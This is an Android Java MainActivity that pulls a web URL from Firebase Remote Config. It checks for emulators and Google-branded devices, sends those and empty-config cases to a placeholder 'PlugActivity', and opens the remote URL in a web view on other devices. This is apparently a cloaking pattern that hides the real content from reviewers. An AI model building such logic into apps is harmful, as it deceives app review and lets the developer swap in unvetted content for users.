package koopez.quente.retts;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.BuildConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import java.io.IOException;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    String url;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        SharedPreferences checkUrl = getSharedPreferences("GetUrl", MODE_PRIVATE);
        String getUrlFromStorage = checkUrl.getString("URL", "");
        if(getUrlFromStorage.equals("")) {
            try {
                FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                        .setMinimumFetchIntervalInSeconds(60)
                        .build();
                mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                mFirebaseRemoteConfig.setDefaultsAsync(R.xml.remote_config_defaults);
                mFirebaseRemoteConfig.fetchAndActivate()
                        .addOnCompleteListener(new OnCompleteListener<Boolean>() {
                            @Override
                            public void onComplete(@NonNull Task<Boolean> task) {
                                if(task.isSuccessful()) {
                                    Log.d("TAG", String.valueOf(task.getResult()));
                                    url = mFirebaseRemoteConfig.getString("url");
                                    Log.e("Tag", url);
                                    if (url.equals("") || checkIsEmu() || url == null) {
                                        redirectToPlug();
                                    } else {
                                        SharedPreferences getUrl = getSharedPreferences("GetUrl", MODE_PRIVATE);
                                        SharedPreferences.Editor getUrlEditor = getUrl.edit();
                                        getUrlEditor.putString("URL", url);
                                        getUrlEditor.putString("LinkPresence", "Yes");
                                        getUrlEditor.apply();
                                        redirectToWebActivity();
                                    }
                                } else {
                                    Log.e("Tag", "Firebase task unsuccessful");
                                    redirectToLostConnection();
                                }
                            }
                        });
            } catch(Exception e) {
                Log.e("Tag", "Firebase Exception - " + e);
                redirectToLostConnection();
            }
        } else {
            redirectToWebActivity();
        }
    }



    private boolean checkIsEmu() {
        if (BuildConfig.DEBUG) return false;
        String phoneModel = Build.MODEL;
        String buildProduct = Build.PRODUCT;
        String buildHardware = Build.HARDWARE;
        String brand = Build.BRAND;
        return (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.toLowerCase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware.equals("goldfish")
                || brand.contains("google")
                || buildHardware.equals("vbox86")
                || buildProduct.equals("sdk")
                || buildProduct.equals("google_sdk")
                || buildProduct.equals("sdk_x86")
                || buildProduct.equals("vbox86p")
                || Build.BOARD.toLowerCase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.toLowerCase(Locale.getDefault()).contains("nox")
                || buildHardware.toLowerCase(Locale.getDefault()).contains("nox")
                || buildProduct.toLowerCase(Locale.getDefault()).contains("nox"))
                || (brand.startsWith("generic") && Build.DEVICE.startsWith("generic"));
    }

    private void redirectToPlug() {
        Intent i = new Intent(MainActivity.this, PlugActivity.class);
        startActivity(i);
        finish();
    }

    private void redirectToWebActivity() {
        Log.e("RedirectToWeb", "Redirect To Web Activity");
        Intent intent = new Intent(MainActivity.this, WebActivity.class);
        startActivity(intent);
        finish();
    }

    private void redirectToLostConnection() {
        Intent intent = new Intent(MainActivity.this, InternetConnectionActivity.class);
        startActivity(intent);
        finish();
    }
}

